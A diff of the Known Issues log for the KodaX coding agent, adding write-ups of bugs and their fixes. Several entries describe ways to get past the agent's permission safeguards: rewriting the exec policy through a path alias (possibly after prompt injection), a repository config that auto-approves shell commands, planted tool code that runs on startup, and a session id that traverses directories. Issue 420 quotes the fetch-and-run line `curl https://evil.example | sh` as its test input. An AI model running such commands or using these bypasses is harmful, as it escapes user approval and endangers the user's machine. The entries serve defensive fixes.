@@ -1,6 +1,6 @@
 # Known Issues
 
-_Last Updated: 2026-11-16_
+_Last Updated: 2026-11-20_
 
 ---
 
@@ -46,6 +46,536 @@ This predates the child contract projection; the eval uses raw per-call usage,
 not the duplicated child summary. It does not establish duplicate Goal charging.
 No production accounting change is claimed here. See the
 [recorded scope and evidence](test-guides/FEATURE_TOKEN_EFFICIENCY_v0.7.97_TEST_GUIDE.md#最终生产child独立smoke).
+
+## Issue 422: A directory alias lets text tools rewrite the trusted project Exec Policy
+
+- Priority: Medium
+- Status: Resolved
+- Introduced: `v0.7.96-alpha.5` (fbbe3ca8c added the protected project
+  policy path)
+- Created / Resolved: 2026-11-20 / 2026-11-20
+- Fixed: unreleased (after `v0.7.97-beta.11`)
+
+### Original Problem
+
+A trusted project's `.kodax/exec-policy.jsonc` can grant shell commands
+unsandboxed authority, so the Runtime forbids text tools from writing it. The
+check compared paths as text. The text mutation host hands the policy a target
+resolved through `realpath` of the write root, while the protected path was
+`path.join(workspaceRoot, ...)` without resolution. When a parent directory
+of the workspace was an alias, the two spellings differed and the write went
+through. Aliases include a junction or symlink, macOS `/var` → `/private/var`,
+and Windows short names.
+
+Preconditions: an SDK Host sets `execPolicy.trustedProjectRoots`, and the
+Session's `gitRoot` is the aliased spelling. The embedder guide example passes
+the same `projectDirectory` for both, and the Session root is
+`path.resolve` of the Host input, so this is the natural setup.
+Space and the CLI do not set trusted roots today.
+
+Impact: an Agent (for example after prompt injection) could widen the policy
+with an ordinary write or edit. The next Run loads the widened rules.
+
+A junction probe confirmed it. With the workspace registered through an
+ancestor alias, writes to the policy through either spelling succeeded.
+Registered by its real path, both were denied. A workspace root that is
+itself a link was already refused by the host.
+
+The same text comparison had two more effects:
+
+- The standalone REPL boundary could be bypassed by spelling the policy path
+  through the other form.
+- Trust matching (`trustedProjectRoots` against the Session root) ignored
+  the policy when one side was the alias. That direction fails safe, but the
+  configured policy silently did not apply.
+
+The shell sandbox was not affected: its deny-write paths are resolved through
+`realpath` on every platform.
+
+### Resolution
+
+- `isSameFilesystemPath` treats two paths as the same location when any of
+  their lexical or resolved spellings match. Resolution walks up to the
+  nearest existing ancestor, so a policy file that does not exist yet is
+  covered.
+- `targetsProtectedPath` uses that comparison, and fails closed when the
+  protected path cannot be resolved (for example a broken junction).
+- `assertTrustedTextMutationPolicy` and the standalone REPL boundary use
+  `targetsProtectedPath`. Both Runtime trust checks and the standalone
+  boundary trust check use `isSameFilesystemPath`.
+
+Files changed: `packages/coding/src/trusted-text-mutation.ts`,
+`packages/repl/src/permission/standalone-shell-boundary.ts`,
+`src/sdk-runtime.ts`.
+
+Tests added:
+
+- `src/windows-text-transaction.test.ts`: with the workspace under an
+  ancestor alias, Full Access writes to the policy through both spellings
+  are denied and nothing is created; an unresolvable protected path denies
+  writes.
+- `packages/repl/src/permission/standalone-shell-boundary.test.ts`: a real
+  trusted root matches an aliased project root, and a commit through the real
+  spelling is denied before reaching the host.
+
+## Issue 421: A Stop can wait five minutes and end as a network failure
+
+- Priority: High
+- Status: Resolved
+- Introduced: `v0.7.97-alpha.12` (3a63d8a73 added `redirect: 'error'` to
+  every SDK provider fetch); Node 20 and 22 only
+- Created / Resolved: 2026-11-20 / 2026-11-20
+- Fixed: unreleased (after `v0.7.97-beta.11`)
+
+### Original Problem
+
+In one PTY acceptance run (`external-run-keyboard-stop`), the REPL stopped a
+managed Run that another client had started. The Stop was recorded and the
+Run's abort signal read aborted. The provider request was never cancelled,
+though. The held stream sent no more chunks, and the OpenAI stream loop only
+checks `signal.aborted` when a chunk arrives. So the Run stayed `unknown` with
+`stop_outcome_unconfirmed` until undici's 300 s body timeout. It then ended
+`failed` with `UND_ERR_BODY_TIMEOUT` instead of `interrupted`. Evidence:
+`%TEMP%\kodax-repl-acceptance-KguqlQ`.
+
+The failing run used Node 22.23.1. The provider fact `cancelled` does not
+prove the request was cancelled: `finishWire` also reports it when the Run's
+own controller (the `abortSignals` store) is aborted.
+
+Expected: a Stop ends the Run as `interrupted` promptly, whether or not the
+provider call observes its abort signal.
+
+### Root Cause
+
+The abort was lost inside undici 6, which Node 20 and 22 bundle as `fetch`.
+Every signal above the fetch did abort. A daemon trace with a GC every 5 ms
+showed the signal the OpenAI SDK listens to aborting with
+`runtime run aborted`, and the SDK aborting its own fetch signal. The server
+socket still stayed open.
+
+- undici links a fetch to its caller's signal only through a `WeakRef` to the
+  internal `Request`'s controller. A `FinalizationRegistry` removes that
+  listener once the `Request` is collected.
+- Nothing keeps that `Request` alive by design. With the default
+  `redirect: 'follow'`, `httpFetch` keeps a shallow copy of the fetch params
+  that still points at `processResponse`, and that closure holds the
+  `Request`. With `redirect: 'error'` the params are reused, `processResponse`
+  is cleared after the headers arrive, and the `Request` becomes collectable
+  while the body is still streaming.
+- `requestExtensionFetch` adds `redirect: 'error'` to every provider fetch.
+  After the next GC, the fetch signal had no undici listener left (the trace
+  saw the count drop from 2 to 1 before the Stop), so the abort never reached
+  the body.
+
+A plain `fetch(url, { signal, redirect: 'error' })` with a forced GC
+reproduces it on Node 20.20.2 (undici 6.24.1) and 22.23.1 (undici 6.27.0).
+Node 24.22.2 (undici 7.30.1) and `redirect: 'follow'` or `'manual'` close the
+socket. Without GC pressure the abort usually wins, which is why the earlier
+reproduction attempts passed.
+
+Node 22's `AbortSignal.any` has a separate GC defect: when an intermediate
+composite is collected, signals later built from it lose the root. The
+provider chain is not exposed to it today. The Run's own signal joins the
+credential signal directly as a leaf, and each later composite stays
+referenced until the stream ends.
+
+### Resolution
+
+- `requestExtensionFetch` pipes each response body through a stream bound to
+  the caller's signal (`bindBodyToSignal`). The pipe holds the signal
+  strongly, so an abort cancels the undici body, which closes the
+  connection, and errors the reader with the abort reason as fetch itself
+  would. Every provider HTTP path goes through this function: the OpenAI and
+  Anthropic SDK clients, Azure, native HTTP and Bedrock.
+- A caller may pass a `Request` that carries the signal instead of
+  `init.signal`. That Request's own signal follows the caller's only while
+  the Request is alive, so the bound body also keeps the Request alive. No
+  built-in provider calls fetch this way; a custom `fetch` caller might.
+- As a backstop for providers that ignore their signal (for example a custom
+  `registerModelProvider` implementation), the managed LLM adapter races each
+  provider call against the Run's abort
+  signal (`raceManagedProviderStop` in `managed-task/llm-adapter.ts`). That
+  covers the primary call and the L5 continuation call. A provider that honours
+  the signal still settles first and keeps its own error. Otherwise the
+  adapter throws the usual `AbortError` with the recovery transcript after one
+  macrotask.
+- The abandoned call is asked to cancel again through the retry timeout
+  controller. Its late outcome is logged to resilience debug and never
+  raised, so a later body timeout cannot change the Stopped outcome.
+
+Files changed: `packages/llm/src/providers/request-extensions.ts`,
+`packages/coding/src/task-engine/_internal/managed-task/llm-adapter.ts`.
+
+Tests added:
+
+- `providers/request-extensions.abort.test.ts`: a held SSE body fetched with
+  `redirect: 'error'` is aborted after forced GC. The reader fails with
+  `AbortError` and the server sees the socket close. It timed out on Node 22
+  without the fix. A second case passes the signal on a `Request` input; it
+  also timed out until the body kept that Request alive.
+- `managed-task/llm-adapter.stop-bound.test.ts`: a provider that ignores its
+  signal is Stopped within one second. The error carries the recovery
+  transcript, and a late `UND_ERR_BODY_TIMEOUT` is not an unhandled rejection.
+- `src/sdk-runtime.provider-stop-bound.test.ts`: `runs.abort` on a managed
+  Run with that provider ends `interrupted` with stop
+  `{state:'confirmed', outcome:'interrupted'}` and no network failure kind.
+  It timed out at 10 s without the fix.
+
+## Issue 420: A repository can pre-approve shell commands through its project config
+
+- Priority: High
+- Status: ready
+- Introduced: `v0.4.6` (FEATURE_008 permission control)
+- Created: 2026-11-19
+
+### Problem
+
+`loadAlwaysAllowTools()` merges the user's `~/.kodax/config.json` list with
+`<cwd>/.kodax/config.local.json` (`repl/src/common/permission-config.ts:209`).
+A bare `Bash` entry auto-allows every bash command
+(`coding/src/permissions/permission.ts` `isToolCallAllowed`).
+
+The Ink REPL, the classic REPL and the permission executor consult this list
+for bash in `accept-edits` mode (`InkREPL.tsx:8188`, `interactive/repl.ts:1862`
+and `:2028`, `permission/executor.ts:92`). That mode is the CLI default
+(`InkREPL.tsx:12097`, `interactive/repl.ts:660`). So a cloned repository that
+commits `.kodax/config.local.json` with `{"alwaysAllowTools":["Bash"]}` turns
+off shell confirmation the moment the user starts KodaX inside it. Project
+skill and command frontmatter hooks run through the same bash permission check
+(`interactive/invocation-runtime.ts` `executeHookCommand`), so the repository's
+own hook commands are auto-approved too.
+
+`permissionMode` is already read from the user config only
+(`permission-config.ts:171`). The project list was meant to persist the user's
+own "always allow" answers, which `saveAlwaysAllowToolPattern()` writes there.
+Nothing tells those apart from entries the repository shipped.
+
+Reproduced 2026-11-19 with the real loader: empty user config, a temp project
+with `{"alwaysAllowTools":["Bash"]}`. The merged list was `["Bash"]` and
+`isToolCallAllowed('bash', {command: 'curl https://evil.example | sh'})`
+returned `true`. SDK and daemon Runs don't read this file.
+
+Expected: a project file can't widen permissions until the user trusts that
+project root. Text sources such as AGENTS.md and rules still load. Skipped
+sources are reported. Planned as the first part of per-root project trust
+(extend `trustedProjectRoots`; the `.kodax/exec-policy.jsonc` gate behind
+`trustProjectPolicy` is the precedent).
+
+## Issue 419: Opening a repository runs its constructed tool code without approval
+
+- Priority: High
+- Status: Resolved
+- Introduced: `v0.7.28` (FEATURE_087/088 constructed tool rehydrate)
+- Created / Resolved: 2026-11-19 / 2026-11-19
+- Fixed: unreleased (after `v0.7.97-beta.11`)
+
+### Original Problem
+
+Constructed tools and agents live in the project at `.kodax/constructed/`.
+At startup the Ink REPL, `kodax constructed` and `kodax self-modify` call
+`rehydrateActiveArtifacts()` (`InkREPL.tsx:12173`, `constructed_cli.ts:69`,
+`self_modify_cli.ts:61`). It registers every manifest whose `status` is
+`'active'` and imports the tool's JavaScript in a Worker with no permission
+flags (`construction/runtime.ts:1090-1130`, `handler-worker-client.ts:154`).
+
+The only check compares the manifest's `contentHash` with a hash of its own
+`content`, both stored in the same file. A repository author can compute it,
+and a manifest with no `contentHash` is accepted as a legacy artifact. So a
+cloned repository that ships an "active" manifest gets its code run as soon as
+the user starts KodaX inside it, without the activation approval the user would
+see for a tool built in their own session. Found by code reading during the
+prompt-customization review (2026-11-19); not reproduced.
+
+Expected: only artifacts that this user approved on this machine are
+rehydrated. Approval evidence must live where the repository cannot write it.
+
+### Resolution
+
+- Activation records an approval in
+  `<config home>/runtime/construction-approvals.json`. That covers both the
+  policy-gated path and the self-modify ask-user path. Tools cannot write to
+  `runtime/`; Agent Home protection already covers it. Each entry holds the
+  canonical project root, kind, name, version and content hash.
+- Rehydrate loads an artifact only when an entry matches all five. Everything
+  else is skipped with a warning and counted as `unapproved`. This includes
+  manifests with no hash, manifests copied from another root, and anything
+  read while the approval file is unreadable. The REPL banner reports the
+  count.
+- To approve a skipped artifact, activate it again. The policy dialog or the
+  self-modify dialog asks the user as usual.
+- The approval file is written under the KodaX file lock and replaced with a
+  rename. If it cannot be read, a warning is shown and the next activation
+  rewrites it.
+
+Files changed: `construction/approvals.ts` (new), `construction/runtime.ts`,
+`construction/types.ts`, `repl/src/common/construction-bootstrap.ts`,
+`repl/src/ui/InkREPL.tsx`.
+
+Tests added in `construction/runtime.test.ts`:
+
+- a planted manifest with a matching hash is refused;
+- a manifest with no hash is refused;
+- an approval does not carry over to another project root;
+- the approval record lives in Agent Home `runtime/`;
+- an unreadable record loads nothing and warns.
+
+`construction-bootstrap.test.ts` now seeds prior versions through an approved
+activation instead of writing an active manifest by hand.
+
+### Remaining Limits
+
+- Tools and agents activated before this fix have no approval entry. Each one
+  must be activated once more after upgrading.
+- Markdown agents in `<project>/.kodax/agents/` still load without trust. They
+  are instructions, not code. Per-root trust for project sources is planned
+  separately.
+
+## Issue 415: Ordinary requests start with a Skill search, and weak models load unrelated Skills
+
+- Priority: High
+- Status: Resolved
+- Introduced: `v0.7.97-beta.5`, compact Worker projection (2e8268354)
+- Created / Resolved: 2026-11-17 / 2026-11-18
+- Fixed: unreleased (4788f47a9, 36fac9eeb, 068b89d15, d02236f84)
+
+### Original Problem
+
+A beta.10 customer reported that ordinary requests, such as installing an
+offline RPM with Docker, made the Agent look for Skills first. `glm-5.3-flash`
+and `deepseek-flash` then loaded unrelated Skills such as `git-workflow` or
+`tdd`. The compact Worker projection rendered the catalog rule as an
+unconditional "invoke a matching Skill as the FIRST action". Several
+amplifiers made it worse: a "Brainstorm required" routing flag, an overflow
+notice that invited guessing unlisted names, and a `kodax_manual` description
+that lost its "KodaX itself" scope.
+
+The audit that followed found the same pattern elsewhere. A projection dropped
+a condition, a keyword guess read as a rule, or the text named tools the mode
+did not have:
+
+- knowledge questions probed the workspace first;
+- the host OS rule leaked into answers about other systems;
+- "open a PR" counted as a review;
+- Script mode presented leaf tools as native.
+
+It also found that the Worker started more child Agents than were free in a
+partly busy tree. The capacity block gave the total, the active count and a
+hard limit, and left the subtraction to the model.
+
+### Resolution
+
+- The Skill catalog holds the only Skill trigger. It contains one conditional
+  "must" plus a no-match path, slash/args handling and a note that guessed
+  names fail. The compact projection no longer restates it.
+- The other dropped conditions are restored; see the commit messages for the
+  full list.
+- ACTOR CAPACITY states the child limit and how many slots are free right now,
+  or that none is. The runtime refresh carries the same fact. A single-slot
+  session gets one line. The scheduler limit is unchanged.
+- A rejected `spawn_agent` result carries a next step: do the track yourself,
+  or start it after a running Agent finishes.
+- The compact context projection (`managed-context-contract`) is deleted. It
+  rewrote the capacity block and would have kept the old wording alive.
+- FEATURE_311 later removed the second Worker and tool text source, so this
+  bug class (one copy changing without the other) can no longer occur.
+
+### Remaining Limits
+
+- `glm-5.3-flash` sometimes sends a `skill` call with arguments and no name. The
+  tool rejects it and the model retries. No wrong Skill loads.
+- `deepseek-flash` can run `git status` before loading `git-workflow` for a
+  commit request when the first turn has no worktree state. With production
+  request bytes it loaded the Skill in 15/15 cells.
+
+### Verification
+
+See [the regression guide](test-guides/ISSUE_415_v0.7.97_REGRESSION_GUIDE.md).
+Paid evals on `glm-5.3-flash`, `deepseek-flash` and `kimi-for-coding` used
+production request bytes, preregistered metrics and blind review:
+
+- Wrong Skill calls on ordinary requests fell to 0 in every candidate batch.
+- Local probes on knowledge questions fell 6 → 2.
+- Over-spawn in busy, full and rejected trees was 0/36 with the new capacity
+  text, against 18/36 for a Codex-style control.
+
+## Issue 414: Remaining Stop-chain limits after the v3 settlement fence
+
+- Priority: Low
+- Status: Open
+- Found: verification of the Issue 413 fix, 2026-11-17
+- Introduced: `v0.7.84` (Actor settlement fence); narrowed by Issue 413
+
+Issue 413 gave every unconfirmed Stop a final outcome. These limits remain.
+None has a field report.
+
+- A canonical save that never settles keeps a workflow-owned Run `unknown`
+  until restart, because the Workflow Promise never returns to release it.
+  The restart works: once Stop is requested, the Run does not block Host stop.
+- The agent loop awaits a tool call or child agent that ignores abort, so
+  Stop on such a Run stays unconfirmed until it returns. Host stop is not
+  blocked; Host exit ends the work and restart marks the Run `interrupted`.
+- On the fenced path a Workflow Run writes no final history and keeps its run
+  directory. Restart recovery owns that cleanup.
+- A foreign owner that stays alive keeps the Session fenced
+  (`actor_owner_conflict`). The Session heals once that process exits.
+- In-process reclaim waits for every tool call admitted before the fence. A
+  tool call that never returns keeps the Session fenced until restart. The
+  restart itself works: a fenced Session does not block Host stop, and quitting
+  Space stops the Host.
+- Session archive and delete stay blocked while the fence holds. They do not
+  probe the owner again.
+- `runtime.close()` stops repair but does not await an Actor write already in
+  flight; restart recovery reads whatever landed.
+
+## Issue 413: Stop-chain paths that still wait for a restart or retry without end
+
+- Priority: Medium
+- Status: Resolved (fixed after `v0.7.97-beta.11`, unreleased)
+- Found: code review during Issue 412, 2026-11-17
+- Introduced: `v0.7.84`–`v0.7.85` (late-settlement reconcile and its Runtime recovery loop)
+- Fixed: unreleased (after `v0.7.97-beta.11`), `actorSettlementConvergence:3`
+- Resolution Date: 2026-11-17
+
+Original problem. A review of the Stop and failure paths after Issue 412 found
+these gaps:
+
+- On `AgentSettlementPersistenceError` or `AgentOwnerConflictError`,
+  `recoverActorDurability` stopped retrying. The Run stayed `unknown` and its
+  Session stayed blocked until another Stop or a restart.
+- For any other error the loop retried until the Runtime closed, with no final
+  outcome.
+- `store.load()` during reconcile and owner takeover had no deadline.
+- At startup a Run whose owner liveness was `unknown` stayed non-terminal, and
+  `runs.abort` refused it as owned by another Runtime.
+- Ordinary mutations treated a rejected save still in `commit_inflight` as a
+  definite failure and rolled back. If that save had landed, the next save was
+  read as an owner takeover.
+- A failed `shutdown()` cached its error after a later reconcile healed the
+  controller.
+
+Verification found three more defects:
+
+- Repair kept writing to Session storage after `runtime.close()` returned.
+- Runs queued behind a healed fence stayed queued.
+- Workflow-owned Runs were excluded from the final outcome. The comment called
+  this deliberate, but the Workflow Promise never released the Run, so it
+  stayed `unknown` and Stop spun. Treated as a defect.
+
+**Resolution.**
+
+- `settleFailedMutation` (`packages/agent/src/actors/controller.ts`) is the only
+  classifier of a failed mutation. It reads the durable snapshot back by
+  revision and owner and returns `committed`, `not_committed`, or `unknown`.
+  A same-owner write that landed is adopted. The owner-takeover reload is
+  bounded by the 5-second settlement deadline.
+- Runtime repair (`src/sdk-runtime.ts`) has a 5-minute budget. A deterministic
+  repair error or an exhausted budget ends the Run `failed` /
+  `actor_settlement_not_persisted` / `effectOutcome: unknown` with Stop
+  `confirmed`. The Session stays fenced while repair continues in the
+  background. A successful repair releases queued Runs. `close()` stops the
+  loop.
+- When same-owner repair cannot succeed, the Runtime reclaims the Actor tree
+  in-process instead of waiting for a restart. The registry's `rebuild` opens
+  a fresh controller that treats the fenced controller's owner as dead and
+  interrupts unfinished turns. It swaps the controllers only after that
+  initialization succeeds. Reclaim waits for pre-fence tool calls to settle,
+  and a live foreign owner still blocks it.
+- `runs.abort` probes the owner again for a Run left non-terminal at startup.
+- Workflow-owned Runs are released to the same path once their Promise settles
+  behind the fence.
+- The capability `actorSettlementConvergence` moved to `3`. See the CHANGELOG
+  and `docs/SDK_MIGRATION.md` for embedder guidance.
+
+**Files Changed:** `packages/agent/src/actors/controller.ts`,
+`src/sdk-runtime.ts`, `src/runtime-daemon/server.ts`,
+`packages/coding/src/runtime-capabilities.ts`, `package.json`.
+
+**Tests Added:** `packages/agent/src/actors/controller.ambiguous-write.test.ts`,
+`src/sdk-runtime.actor-stop-late-commit.test.ts` (including the in-process
+reclaim and queued-continuation cases),
+`src/sdk-runtime.actor-stop-late-commit-workflow.test.ts`, the "Stop on a Run
+whose owner was unconfirmed at startup" block, "lets a client require Actor
+settlement convergence v3", "never takes over a live foreign Actor owner
+while repair retries in the background" and the two "lets the Host stop while
+a stopped … never returns" cases in `src/sdk-runtime.test.ts`.
+
+**Verification:** each new test failed before its fix. Remaining limits are in
+Issue 414.
+
+## Issue 412: Stop never finishes after a sibling interruption save commits late
+
+- Priority: High
+- Status: Resolved (fixed after `v0.7.97-beta.11`, unreleased)
+- Observed: Space 0.1.47-beta.1 / SDK 0.7.97-beta.11, GitHub issue
+  icetomoyo/KodaX#2, 2026-11-15
+- Introduced: `v0.7.84` (same-owner late-settlement reconcile); the strict
+  conflict fence was asserted in `v0.7.85`
+- Fixed: unreleased (after `v0.7.97-beta.11`)
+- Resolution Date: 2026-11-17
+
+A Run had two parallel child Actors, `/root/gen-S1-A` and `/root/gen-S1-B`. The
+user pressed Stop while the disk was busy. The Stop wrote both turns as
+`interrupted` in one save. That save missed its 5-second deadline
+(`AgentSettlementAttemptTimeoutError`) and committed about 2 seconds later.
+Every later Stop failed with "The durable Actor snapshot contains a conflicting
+terminal fact". The UI stayed on "正在修复并停止", and after the daemon was
+killed the Run was left `phase: unknown` / `stop_outcome_unconfirmed`.
+
+Root cause, reproduced by test: Stop's `quiesce` marks every live turn
+`interrupted` and aborts their executors. Each aborted executor then records a
+`failed` settlement intent. The timed-out save fenced the controller. Reconcile
+loaded the late snapshot, found `interrupted` where the intent said `failed`, and
+treated it as a conflict. Intents are only ever `completed` or `failed`, so the
+mismatch was deterministic and every retry failed the same way.
+
+Reconcile now lets the durable terminal fact win when the snapshot is ours. That
+matches `applySettlementIntent()` in memory. Owner IDs are unique per controller
+instance, so a terminal fact under our owner was written by this controller. An
+`interrupted` fact is the expected Stop race and settles quietly. Any other
+mismatch keeps the durable fact and reports the unpersisted executor result
+through `onBackgroundError`, so Stop still completes. Foreign owners stay
+fail-closed. Settlement without a timeout is unchanged.
+
+The review of the Stop chain found three more defects on the same path, fixed
+here:
+
+- Two Runtime callbacks that finish a repaired Run (`recoverActorDurability`'s
+  completion and `abortRun`'s cancellation) had no error handling. A terminal
+  status save that failed twice became an unhandled rejection, which ends the
+  daemon process. They now record `run_settlement_not_persisted` like the shell
+  cleanup path.
+- `markRunTerminal` left the in-memory Run looking terminal (`interrupted`,
+  Stop `confirmed`) after its status save failed, while the file still said
+  `unknown`. Close and Stop retries then skipped the Run. It now restores the
+  fields it changed, so a later Stop can finish the Run.
+- `quiesce` waited the 30-second queue deadline when its mutation was refused
+  before it started (owner lost, controller closing). It then reported
+  `actor_settlement_not_persisted` and fenced the controller, which also blocked
+  a shutdown retry. That refusal is now returned at once without a fence.
+
+Remaining gaps on this path are tracked in Issue 413.
+
+**Files Changed:** `packages/agent/src/actors/controller.ts`,
+`src/sdk-runtime.ts`.
+
+**Tests Added:**
+- `packages/agent/src/actors/controller.test.ts`: `settles a Stop whose
+  timed-out sibling interruption commits late`, `adopts a conflicting
+  same-owner terminal fact instead of fencing every retry` (replaces `keeps a
+  conflicting same-owner terminal fact fenced`), and `rejects a Stop that cannot
+  start its mutation without waiting or fencing`.
+- `src/sdk-runtime.actor-stop-late-commit.test.ts`: a Runtime Run with two
+  child Actors whose Stop save commits after its deadline reaches
+  `interrupted` with Stop `confirmed` without a second Stop. When the
+  terminal status save then fails, the daemon stays up, the Run reports
+  `run_settlement_not_persisted`, and a later Stop finishes it.
+
+**Verification:** each new test failed on the old code. The Run-level test
+reproduced the customer's `status.json` (`unknown`,
+`actor_settlement_not_persisted`). It is not yet confirmed why the customer's
+Run was still `unknown` after the daemon was killed. A likely path is a startup
+owner probe that answered `unknown`, which left the Run non-terminal; Issue 413
+makes Stop probe that owner again.
 
 ## Issue 411: Space's memory UI cannot see notes while note memory is on by default
 
@@ -871,14 +1401,23 @@ Still open at `08ce2f742`; F-ids match the removed list.
   type-checked, and `packages/repl/tsconfig.json` excludes
   `terminal-emulator.ts` (F-43). No LLM-free test asserts every default model has
   a rate and a model-level limit.
-- Prompt cache: SA adds git-context/project-snapshot only when
-  `messages.length === 1`, so the system prompt shifts on request two. The cost
+- Prompt cache: the direct `runKodaX` engine (formerly SA) adds
+  git-context/project-snapshot only when `messages.length === 1`
+  (`run-substrate.ts:1439`), so the system prompt shifts on request two. The cost
   is unmeasured; measure with `probe:prompt-cache` before changing it (F-18).
-- ADR-033 debt: quantitative thresholds in `static-text.json`
-  (`worker.repoIntelligenceTools`, `exit_plan_mode.properties.plan`), a compound
-  condition in `compact-worker-contract`, a bare "Read first." in the compact
-  edit description, and "≤40 lines, ≤3 bullet levels" in `managed-tool-text.ts`
-  (F-19). Eval added for denied-write recovery: `tests/feature-189-batch5-exit-plan-mode-rejection.eval.ts`
+- ADR-033 debt (F-19): two real violations were fixed on 2026-11-19, each with
+  a blind A/B eval and no regression. `worker.repo-tools.module-context` now
+  names the need, a module's overall shape, instead of "3+ files" (5a168b5f4).
+  The managed edit description says why to read first (c16288618). Three
+  audited items stay as written. The plan limit "≤40 lines, ≤3 bullet levels"
+  in `exit_plan_mode` is an output format budget, not a decision threshold.
+  "Two or more substantive independent lanes and a child slot is free" defines
+  when a split pays off, and Issue 415 re-evaluated it. The interrupt rule "no
+  progress signal AND a faster path exists" is one action with two
+  prerequisites; the next line already says to wait while a child makes
+  progress. Still open: the `repo-explorer` builtin
+  agent says "Use module_context before reading 3 or more files in one module"
+  (`construction/builtin-agents.md`). Eval added for denied-write recovery: `tests/feature-189-batch5-exit-plan-mode-rejection.eval.ts`
   compares pre/post-2ee4a782d wording on a seeded rejection turn; run results are pending (F-46).
 - Metadata: the Codex CLI bridge declares `prompt-only`/128K while the
   capability table says `codex-cli-effort`; which wins is unverified (F-20).
@@ -3074,6 +3613,17 @@ by the focused sandbox, lineage, REPL, and coding-runtime tests.
 
 | ID | Priority | Status | Title | Introduced | Fixed | Created | Resolved |
 |----|----------|--------|-------|------------|-------|---------|----------|
+| 422 | Medium | Resolved | A directory alias lets text tools rewrite the trusted project Exec Policy | `v0.7.96-alpha.5` | unreleased (after `v0.7.97-beta.11`) | 2026-11-20 | 2026-11-20 |
+| 421 | High | Resolved | A Stop can wait five minutes and end as a network failure | v0.7.97-alpha.12 | unreleased (after `v0.7.97-beta.11`) | 2026-11-20 | 2026-11-20 |
+| 420 | High | ready | A repository can pre-approve shell commands through its project config | `v0.4.6` | - | 2026-11-19 | - |
+| 419 | High | Resolved | Opening a repository runs its constructed tool code without approval | `v0.7.28` | unreleased (after `v0.7.97-beta.11`) | 2026-11-19 | 2026-11-19 |
+| 418 | High | Resolved | A2A Tasks in one context lose the earlier conversation | `v0.7.85` (FEATURE_291) | unreleased (after `v0.7.97-beta.11`) | 2026-11-18 | 2026-11-18 |
+| 417 | High | Resolved | Host `create` and `fork` accept session ids that leave the sessions directory | observed on `v0.7.97-beta.11`; first affected version unknown | unreleased (after `v0.7.97-beta.11`) | 2026-11-17 | 2026-11-17 |
+| 416 | High | Resolved | Provider requests carry no session id for gateways | every released version | unreleased (after `v0.7.97-beta.11`) | 2026-11-17 | 2026-11-17 |
+| 415 | High | Resolved | Ordinary requests start with a Skill search, and weak models load unrelated Skills | `v0.7.97-beta.5` (compact Worker projection) | unreleased (after `v0.7.97-beta.11`) | 2026-11-17 | 2026-11-18 |
+| 414 | Low | Open | Remaining Stop-chain limits after the v3 settlement fence | `v0.7.84` | - | 2026-11-17 | - |
+| 413 | Medium | Resolved | Stop-chain paths that still wait for a restart or retry without end | `v0.7.84`-`v0.7.85` | unreleased (after `v0.7.97-beta.11`) | 2026-11-17 | 2026-11-17 |
+| 412 | High | Resolved | Stop never finishes after a sibling interruption save commits late | `v0.7.84` | unreleased (after `v0.7.97-beta.11`) | 2026-11-17 | 2026-11-17 |
 | 411 | Medium | Open | Space's memory UI cannot see notes while note memory is on by default | FEATURE_308 default flip (unreleased, `KodaX-next-dev`) | — | 2026-11-15 | — |
 | 410 | Medium | Resolved | A client exit stop with a connected peer drains the Host and answers late | `v0.7.97-alpha.2` (client exit receipts) | `v0.7.97-beta.9` | 2026-11-13 | 2026-11-13 |
 | 409 | High | Resolved | Windows daemon Job proof and failed-start cleanup prevent recovery | observed in v0.7.97-beta.4 (customer report); PowerShell Job probe since v0.7.97-alpha.7 | `v0.7.97-beta.8` | 2026-11-12 | 2026-11-12 |
@@ -3371,6 +3921,124 @@ by the focused sandbox, lineage, REPL, and coding-runtime tests.
 ---
 
 ## Issue Details
+
+### Issue 418: A2A Tasks in one context lose the earlier conversation
+
+- Priority: High
+- Status: Resolved
+- Introduced: `v0.7.85` (FEATURE_291)
+- Created: 2026-11-18
+- Fixed: unreleased (after `v0.7.97-beta.11`)
+- Resolution Date: 2026-11-18
+- Related: Issue 416, ADR-061, ADR-077
+
+**Original Problem.** Each A2A Task created its own Runtime Session. A client
+that sent a follow-up as a new Task in the same `contextId` reached a model
+with none of the earlier exchanges. With Issue 416, a gateway would also see a
+different `X-Session-Id` for each Task of one A2A conversation. Up to
+`v0.7.84`, a new Task reused the Session of an earlier Task in its context.
+FEATURE_291 gave every Task its own Session along with its own event cursor.
+Found while checking which session id A2A runs send.
+
+**Resolution.** Tasks in one principal's context share the Runtime Session
+`a2a-<sha256(principal key, contextId)>`. The first Task creates it. Later
+Tasks reuse the id when `create` reports a conflict. Each Task keeps its own
+cursor, and replay and subscription stay run-scoped. The Host queues a run
+behind the Session's active run, so overlapping Tasks run in order. Tasks
+created before the fix keep their own Sessions, so the first new Task in an
+existing context starts the shared Session empty.
+
+**Files Changed.** `src/a2a/server.ts`.
+
+**Tests Added.** `src/a2a/context-session.test.ts` drives a real Runtime. It
+checks that a second Task in a context sees the first question and answer,
+that other contexts and other principals get separate Sessions, and that a
+Task sent while another runs waits and then sees the first answer. The
+`src/a2a/a2a.test.ts` case that required one Session per Task was removed.
+
+### Issue 417: Host `create` and `fork` accept session ids that leave the sessions directory
+
+- Priority: High
+- Status: Resolved
+- Introduced: observed on `v0.7.97-beta.11`; first affected version unknown
+- Created: 2026-11-17
+- Fixed: unreleased (after `v0.7.97-beta.11`)
+- Resolution Date: 2026-11-17
+- Related: Issue 416, ADR-077
+
+**Original Problem.** Host `create({ sessionId })` and
+`fork({ newSessionId })` used the caller's id as a file name without checking
+it. An id such as `../escape` wrote the session file outside the sessions
+directory. Such ids would also have reached gateways in `X-Session-Id`
+(Issue 416). Found while reviewing the Issue 416 fix.
+
+**Resolution.** A new caller id must be 1-128 characters from
+`[A-Za-z0-9_-]`, must not be a Windows device name (`CON`, `PRN`, `AUX`,
+`NUL`, `COM1`-`COM9`, `LPT1`-`LPT9`, any case), and must not start with
+`archived-`. Anything else fails with `invalid_params` before any file is
+written. Ids of existing sessions are read as stored. `load`, `resume`, and a
+`session.id` passed directly to `runKodaX` are not checked; this change does
+not cover them.
+
+**Files Changed.** `src/sdk-runtime.ts`.
+
+**Tests Added.** `src/sdk-runtime.session-id.test.ts` checks that `create`
+rejects traversal, path separators, dots, colons, spaces, empty and
+over-long ids, device names in any case, and the `archived-` prefix. It checks
+that `fork` rejects traversal, dots and device names, and that a 128-character
+opaque id is accepted.
+
+### Issue 416: Provider requests carry no session id for gateways
+
+- Priority: High
+- Status: Resolved
+- Introduced: every released version
+- Created: 2026-11-17
+- Fixed: unreleased (after `v0.7.97-beta.11`)
